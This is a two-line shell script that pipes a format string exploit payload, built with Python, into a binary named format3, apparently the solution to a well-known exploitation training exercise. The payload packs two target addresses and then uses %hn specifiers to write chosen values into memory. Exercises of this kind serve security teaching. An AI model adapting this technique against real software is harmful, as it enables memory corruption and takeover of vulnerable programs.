#! /bin/sh
python -c "print '\x48\xa0\x04\x08'+'\x4a\xa0\x04\x08'+'%250x'+'%13\$hn'+'%21570x'+'%12\$hn'" | ./format3
